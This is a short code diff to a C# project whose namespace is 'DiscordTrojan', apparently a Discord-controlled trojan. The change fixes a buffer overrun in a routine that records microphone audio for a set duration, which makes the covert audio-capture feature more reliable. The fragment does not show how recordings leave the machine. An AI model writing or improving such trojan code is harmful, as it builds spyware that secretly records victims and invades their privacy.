@@ -203,8 +203,10 @@ namespace DiscordTrojan
                         // Record audio for the specified duration
                         waveInEvent.DataAvailable += (s, a) =>
                         {
-                            Buffer.BlockCopy(a.Buffer, 0, buffer, bytesRead, a.BytesRecorded);
-                            bytesRead += a.BytesRecorded;
+                            int bytesToCopy = Math.Min(a.BytesRecorded, buffer.Length - bytesRead);
+                            Buffer.BlockCopy(a.Buffer, 0, buffer, bytesRead, bytesToCopy);
+                            bytesRead += bytesToCopy;
+
                             if (bytesRead >= buffer.Length)
                             {
                                 waveInEvent.StopRecording();
@@ -239,7 +241,6 @@ namespace DiscordTrojan
                         // Wait for the specified duration before stopping recording
                         Thread.Sleep(audioDurationSeconds * 1000);
                     }
-
                 }
             }
             return Task.CompletedTask;
